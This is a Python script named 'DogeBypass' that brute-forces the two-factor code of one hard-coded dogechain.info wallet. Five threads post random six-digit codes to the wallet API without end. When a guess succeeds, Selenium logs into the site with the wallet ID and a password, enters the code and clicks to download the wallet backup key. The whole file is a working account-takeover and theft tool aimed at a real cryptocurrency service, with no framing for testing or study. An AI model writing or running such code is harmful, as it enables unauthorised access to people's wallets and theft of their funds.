import sys
import time
import re
import subprocess
from os import system
import os
import math
sys.stdout.flush()
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
import random
import requests
import threading
import chromedriver_autoinstaller
chromedriver_autoinstaller.install()
options = webdriver.ChromeOptions()
#options.headless = True
options.add_argument(" --mute-audio")
options.add_argument("user-agent=Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36")
system("title DogeBypass")


class MyThreadClass(threading.Thread):
  def run(self):
    for x in range(9999999999):
        F2Akey = random.randint(100000, 999999)
        url = "https://dogechain.info/wallet/api"
        data = {'method': 'get', 'guid': '120029cd-7922-4684-82d7-b1560023a049', 'two_fa_token': F2Akey}

        session = requests.Session()
        r = session.post(url, data=data)

        if (r.status_code == 200):
            print(self.getName(),str(F2Akey) + " " + str(datetime.now()) + " Mazal TOV! found it")
            Login(F2Akey)

        if (r.status_code == 404):
            print(self.getName(),str(F2Akey) + " " + str(datetime.now()) + " " + str(r.status_code))

for i in range(5):
  t = MyThreadClass()
  t.start()




def Login(F2Akey):
    global driver
    driver = webdriver.Chrome('chromedriver', options=options)
    driver.get("https://my.dogechain.info/#/overview")
    time.sleep(5)
    if ("Log in" in driver.page_source):
        print(str(datetime.now()) + " Login")
        driver.find_element_by_xpath('//*[@id="wrapper"]/section/div[3]/article[2]/div[1]/section/a').click()
        time.sleep(2)
        elem = driver.find_element_by_name("guid")
        elem.send_keys("120029cd-7922-4684-82d7-b1560023a049")
        time.sleep(1)
        driver.find_element_by_xpath('//*[@id="wrapper"]/section/div[3]/article[2]/div[2]/div/div/div[2]/div[4]/form/div[2]/div/input').click()
        elem = driver.find_element_by_xpath('//*[@id="wrapper"]/section/div[3]/article[2]/div[2]/div/div/div[2]/div[4]/form/div[2]/div/input')
        elem.send_keys("PASSWORD")
        driver.find_element_by_xpath('//*[@id="wrapper"]/section/div[3]/article[2]/div[2]/div/div/div[3]/button[2]').click()
        time.sleep(4)
        if ("Please enter the two-factor authentication details" in driver.page_source):
            print(str(datetime.now()) + " F2A")
            elem = driver.find_element_by_name("token")
            elem.send_keys(F2Akey)
            driver.find_element_by_xpath('//*[@id="wrapper"]/section/div[3]/article[2]/div[2]/div/div/div[3]/button[3]').click()
            time.sleep(5)
            if("Backup" in driver.page_source):
                print(str(datetime.now()) + " Found A vaild F2A key!!!")
                time.sleep(5)
                driver.find_element_by_xpath('/html/body/section/div[1]/section/div[1]/article/div/section/div[1]/div[2]/div/button').click()
                print(str(datetime.now()) + " Downloading key")







